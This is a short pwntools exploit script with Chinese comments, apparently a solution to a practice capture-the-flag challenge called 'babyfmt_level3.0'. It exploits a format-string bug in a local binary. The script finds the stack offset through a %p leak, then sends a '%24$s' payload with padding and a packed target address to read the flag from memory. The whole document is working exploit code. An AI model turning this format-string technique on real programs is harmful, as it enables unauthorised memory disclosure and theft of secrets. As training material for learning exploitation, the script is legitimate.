from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'
io = process("./babyfmt_level3.0")

flag_addr = 0x404110

#payload = b'BBBAAAAAAAA %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p  %17$p %18$p %19$p %20$p %21$p %22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p %30$p'
"""
===============================
1. 找到目标地址
2. 打表找出偏移
3. 调试偏移量适当补充缓冲区
===============================
通过打表得出偏移量为 23
但是 p64 会有大量 \x00 截断字符串
所以要把地址放后面，因而要大量调试补充 buf (AAA) 来让第 24 位对应合适的地址信息
"""
payload =  b'%24$sAAAAAA' + p64(flag_addr)

print(payload)

io.recvuntil(b"data!")
io.sendline(payload)
io.interactive()
